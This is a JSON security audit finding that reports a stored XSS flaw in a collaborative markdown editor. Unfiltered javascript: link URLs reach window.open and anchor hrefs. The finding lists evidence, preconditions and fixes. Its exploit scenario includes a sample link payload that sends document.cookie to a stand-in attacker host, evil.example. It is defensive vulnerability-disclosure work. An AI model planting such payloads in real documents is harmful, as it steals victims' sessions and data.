{
  "findings": [
    {
      "ruleId": "xss.link-url-scheme",
      "category": "xss",
      "title": "Stored XSS via unfiltered link URL scheme (javascript:) opened from the editor",
      "severity": "MEDIUM",
      "difficulty": "LOW",
      "confidence": "MEDIUM",
      "rationale": "Severity is MEDIUM: the impact is stored script execution in the application origin (broad access to the victim's documents), but exploitation requires victim interaction (clicking the planted link), which the rubric bounds at MEDIUM. Difficulty is LOW: planting a javascript: markdown link is a common technique needing only write access to a shared document and no special knowledge or tooling. Confidence is MEDIUM: every hop inside the repository is read and verified end to end — the codec preserves link destinations verbatim and the UI contains no scheme allowlist anywhere — but the final defense question rests inside @platejs/link 52.0.11's getLinkAttributes, whose source is absent from this tree (no node_modules or cache on disk), so its passthrough behavior is asserted from the plugin's documented design rather than read code; if that helper silently strips javascript: URLs, the finding collapses.",
      "file": "ui/src/features/editor/PlateMarkdownEditor.tsx",
      "line": 1128,
      "symbol": "LinkElement",
      "identity": {
        "anchor": "link-open-url-dispatch"
      },
      "snippet": "            window.open(attributes.href, '_blank', 'noopener,noreferrer');",
      "impact": "An attacker who can write markdown into a document (collab invite with editor role, an agent, a Git/FUSE import, or a shared tmp-document link) plants a link whose URL uses the javascript: scheme. When a victim opens the document and Cmd/Ctrl+clicks the link (or plain-clicks it in Viewing mode, or uses the floating toolbar's Open button), the script executes in the Quarry web origin with the victim's full access: same-origin fetch to every /v1 API (read/overwrite/delete all documents in every library), localStorage contents, and the ability to exfiltrate document contents and collab invite tokens to an external server.",
      "evidence": [
        "ui/src/api/client.ts:147 — getDocument fetches the remote markdown document body via fetch(documentRefUrl(ref)); this content is attacker-writable by any collaborator holding an invite token, by agents, or via Git/FUSE imports, and no sanitization is applied.",
        "ui/src/app/document-body.tsx:69-80 — DocumentBody passes the server-supplied content string directly into MarkdownEditor (which renders PlateMarkdownEditor) for any markdown document.",
        "ui/src/features/review/rfm-codec.ts:43 — markdownToReview deserializes the untrusted markdown into Plate nodes with api.markdown.deserialize; mdast link destinations are preserved verbatim (markdown-codec.test.ts:23 asserts '[a link](guide.md)' round-trips unmodified, and remark's mdast layer performs no protocol filtering).",
        "ui/src/features/editor/PlateMarkdownEditor.tsx:1117 — LinkElement derives its anchor attributes with getLinkAttributes(props.editor, props.element), so attributes.href is the link node's attacker-controlled url; a sweep of ui/src confirms the application performs no scheme allowlist anywhere (no javascript:/allowedSchemes/DOMPurify handling outside the mermaid comment).",
        "ui/src/features/editor/PlateMarkdownEditor.tsx:1127-1129 — on Cmd/Ctrl+click the handler calls window.open(attributes.href, '_blank', 'noopener,noreferrer'); a javascript: URL opened this way executes with the opener's origin, bypassing the noopener flag, which only severs window.opener.",
        "ui/src/features/editor/PlateMarkdownEditor.tsx:1248-1255 — downstream effect of the same root control: LinkOpenButton spreads the same unvalidated attributes (including href) onto a plain <a target=\"_blank\">, and the PlateElement itself renders as <a> with that href (lines 1121-1125), so in Viewing (read-only) mode a plain left-click on the link navigates the javascript: URL directly.",
        "Guard check — the only possible defense is inside @platejs/link 52.0.11's getLinkAttributes (ui/package.json:27 pins the version, but node_modules is absent from the tree and from every cache on disk, so its body could not be read); the repository itself contains no scheme validation, and known insert-time validators in the link plugin (isUrl/validateUrl) do not run on the markdown-deserialize or Yjs-collab paths that create these link nodes."
      ],
      "exploitScenarios": [
        "Attacker obtains write access to a document the victim will open (accepts or holds an editor invite token, writes via an agent, or lands content through a Git/FUSE import).",
        "Attacker stores markdown containing a link such as [release notes](javascript:fetch('https://evil.example/?c='+document.cookie)) in the shared document.",
        "Victim opens the document in Quarry; the codec turns the link into a Plate link node with the javascript: URL preserved.",
        "Victim Cmd/Ctrl+clicks the link (or left-clicks it in Viewing mode, or clicks Open in the link floating toolbar).",
        "window.open / anchor navigation executes the javascript: payload in the Quarry origin, giving the attacker the victim's full API access to all libraries and documents."
      ],
      "preconditions": [
        "Attacker can write markdown content into a document the victim opens (collaborator with editor role, agent write, Git/FUSE import, or a shared tmp document).",
        "Victim interacts with the link (Cmd/Ctrl+click while editing, plain click in Viewing mode, or the floating toolbar Open button).",
        "@platejs/link's getLinkAttributes passes the node url through to href without scheme filtering (pinned version 52.0.11; dependency source unavailable in this tree, so this hop is asserted from the plugin's documented behavior, not from read code — hence MEDIUM confidence)."
      ],
      "recommendations": [
        "Root fix: validate the URL scheme at the dispatch/render point — in LinkElement and LinkOpenButton, allow only http:, https:, mailto:, and relative URLs (parse with new URL(url, location.origin) and check protocol); render anything else as inert text or '#', and never pass it to window.open or an anchor href.",
        "Hardening: neutralize dangerous schemes at ingest in the markdown codec (markdown-codec.ts / rfm-codec.ts deserialize step) so javascript:/data: URLs never enter the Plate value, protecting every downstream consumer including future ones.",
        "Regression test: deserialize '[x](javascript:alert(1))' through markdownToReview, render LinkElement, simulate Cmd+click, and assert window.open is not called with a javascript: URL and the rendered anchor's href is neutralized; repeat for the LinkOpenButton anchor."
      ]
    }
  ]
}